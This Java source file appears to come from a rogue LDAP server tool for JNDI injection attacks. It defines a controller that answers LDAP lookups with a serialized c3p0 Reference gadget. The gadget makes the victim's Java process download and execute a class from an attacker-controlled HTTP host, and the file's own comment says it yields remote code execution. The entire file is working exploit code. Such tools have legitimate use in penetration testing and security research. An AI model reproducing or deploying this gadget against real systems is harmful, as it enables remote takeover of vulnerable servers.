package artsploit.controllers;

import artsploit.Config;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.IOException;
import javax.naming.Name;
import javax.naming.Reference;
import java.util.Hashtable;
import javax.naming.StringRefAddr;
import org.apache.commons.codec.binary.Hex;

import static artsploit.Utilities.serialize;

/**
 *  Via arbitrary bean creation in {@link com.mchange.v2.naming.JavaBeanObjectFactory} we can force the loading of
 *  a reference object. This reference will be used by c3p0 to load bytecode from an attacker controlled service,
 *  similar to a classic JNDI attack.
 *
 * Yields:
 *  RCE via remote classloading.
 *
 * @author h0ng10
 */
@LdapMapping(uri = { "/o=c3p0" })
public class C3p0 implements LdapController {
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP ResourceRef result for " + base );

        String classloaderUrl = "http://" + Config.hostname + ":" + Config.httpPort + "/xExportObject.jar";

        String overrideString = makeC3P0UserOverridesString(classloaderUrl, "xExportObject");
        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any

        Reference c3p0Reference = new Reference("com.mchange.v2.c3p0.WrapperConnectionPoolDataSource", "com.mchange.v2.naming.JavaBeanObjectFactory", null);
        c3p0Reference.add(new StringRefAddr("userOverridesAsString", overrideString));

        e.addAttribute("javaSerializedData", serialize(c3p0Reference));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    // Taken from Moritz Bechlers Marshalsec repository
    // https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/gadgets/C3P0WrapperConnPool.java
    public static String makeC3P0UserOverridesString ( String codebase, String clazz ) throws ClassNotFoundException, NoSuchMethodException,
            InstantiationException, IllegalAccessException, InvocationTargetException, IOException {

        ByteArrayOutputStream b = new ByteArrayOutputStream();
        try ( ObjectOutputStream oos = new ObjectOutputStream(b) ) {
            Class<?> refclz = Class.forName("com.mchange.v2.naming.ReferenceIndirector$ReferenceSerialized"); //$NON-NLS-1$
            Constructor<?> con = refclz.getDeclaredConstructor(Reference.class, Name.class, Name.class, Hashtable.class);
            con.setAccessible(true);
            Reference jndiref = new Reference("Foo", clazz, codebase);
            Object ref = con.newInstance(jndiref, null, null, null);
            oos.writeObject(ref);
        }

        return "HexAsciiSerializedMap:" + Hex.encodeHexString(b.toByteArray()) + ";"; //$NON-NLS-1$
    }
}